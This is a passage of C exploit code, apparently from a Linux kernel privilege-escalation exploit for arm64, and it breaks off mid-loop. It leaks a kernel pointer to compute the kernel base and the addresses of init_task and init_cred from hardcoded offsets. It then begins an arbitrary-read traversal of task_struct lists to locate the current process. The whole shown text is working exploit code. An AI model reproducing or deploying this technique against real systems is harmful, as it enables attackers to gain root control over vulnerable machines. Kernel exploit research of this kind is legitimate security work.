...
// 1-5. leak shm_file_data->ns
    ...
    kbase = init_ipc_ns - (0xffff000009712e00 - 0xffff000008000000);
    init_task = kbase + (0xffff0000096f2180 - 0xffff000008000000);
    init_cred = kbase + (0xffff0000096fe0d8 - 0xffff000008000000);
    printf("[+] init_ipc_ns: 0x%llx\n", init_ipc_ns);
    printf("[+] kbase: 0x%llx\n", kbase);
    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] init_cred: 0x%llx\n", init_cred);

// 2. use arb read to traverse task_struct->tasks (at 0x360), find current task_struct via task_struct->pid (at 0x460) 
    int32_t pid, cur_pid;
    int64_t prev, curr;
    cur_pid = getpid();
    printf("current pid:%d\n", cur_pid);

    prev = (void *)init_task + 0x360;
    while (pid != cur_pid)
    {
        curr = prev - 0x360;                    // current task_struct address
        memset((void *)&evil, 0, sizeof(msg_header));
        memset(received, 0, sizeof(received));
        memset(buffer, 0, sizeof(buffer));
